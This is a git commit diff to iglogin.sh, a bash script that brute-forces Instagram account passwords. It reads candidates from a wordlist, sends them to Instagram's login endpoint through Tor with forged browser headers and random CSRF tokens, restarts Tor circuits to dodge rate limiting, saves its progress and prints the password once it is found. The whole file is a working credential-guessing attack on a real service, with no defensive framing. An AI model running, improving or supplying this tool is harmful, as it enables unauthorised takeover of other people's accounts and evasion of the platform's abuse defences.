e5f7ef0248f63784caa634cab264cd176d0039fc
simone <s1763f@gmail.com>
2022-04-20 23:49:51 +0200

    Misc Optimization

--- iglogin.sh
+++ iglogin.sh
@@ -1,35 +1,27 @@
 #!/bin/bash
-
 gen () {
 token=$(head /dev/urandom | base64 | tr -d '[:digit:]' | tr -d '+/=' | tail -c 33)
 rand=$(head /dev/urandom | base64 | tr -d '[:alpha:]' | tr -d '+/=' | tail -c 11)
 }
-
 if [ ! -f "$2" ]; then
 echo "Non regular wordlist file"
 exit 1
 fi
-
 if ! which curl &>/dev/null; then
 echo "Install curl"
 exit 2
 fi
-
 if ! which tor &>/dev/null; then
 echo "Install tor"
 exit 3
 fi
-
 if [[ "$UID" != 0 ]]; then
 echo "Run it with su or sudo "
 exit 4
 fi
-
 token=""
 rand=""
 ft=$(cat "$2" | md5sum | cut -d ' ' -f1)
-progressive=1
-
 if [ -f "$1_$ft" ]; then
 echo "Existing Session Found"
 line_counter=$(sed '1q;d' "$1_$ft")
@@ -42,13 +34,11 @@ line_counter=1;
 sedline=$line_counter'q;d'
 line=$(sed "$sedline" "$2")
 fi
-
 echo "Booting up Tor";
 killall tor &>/dev/null;
 (sudo -u \#"$SUDO_UID" tor --SOCKSPort "$3" 1>/dev/null) &
 echo "Waiting for tor opening"
 sleep 25
-
 gen
 url='https://www.instagram.com/accounts/login/ajax/'
 ct='Content-Type: application/x-www-form-urlencoded'
@@ -62,37 +52,24 @@ co='Connection: keep-alive'
 req='X-Requested-With: XMLHttpRequest'
 ig='X-IG-WWW-Claim: 0'
 size=$(wc -l "$2" | cut -d ' ' -f1)
-
-echo "Trying $line_counter of $size"
-
 while :
 if [[ "$line_counter" -gt "$size" ]]; then
 echo "Password not in wordlist"
 exit 5
 fi
-
 do
 curl --socks5-hostname 127.0.0.1:"$3" -H "$ct" -H "$ac" -H "$ae" -H "$ho" -H "$or" -H "$ua" -H "$re" -H "$co" -H "$req" -H "$ig" -H "X-CSRFToken: $token" --data "username=$1&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A$rand%3A$line&queryParams=%7B%7D&optIntoOneTap=false" --compressed 1>response.txt "$url" 2>/dev/null
 response=$(cat response.txt)
-
 if [[ $response == *'authenticated":true'* || $response == *'checkpoint_required'* ]]; then
  echo "The Password is $line"
  exit 0
 fi
-
 if [[ $response == *'authenticated":false'* ]]; then
  line_counter=$((line_counter+1))
  echo $line_counter > "$1_$ft"
  sedline=$line_counter'q;d'
  line=$(sed $sedline "$2")
- progressive=$((progressive+1))
  echo "Trying $line_counter of $size"
-  if [[ $((progressive%4)) == 0 ]]; then
-  progressive=0
-  killall -HUP tor
-  sleep 2
-  gen
-  fi
 else
 killall -HUP tor
 sleep 2
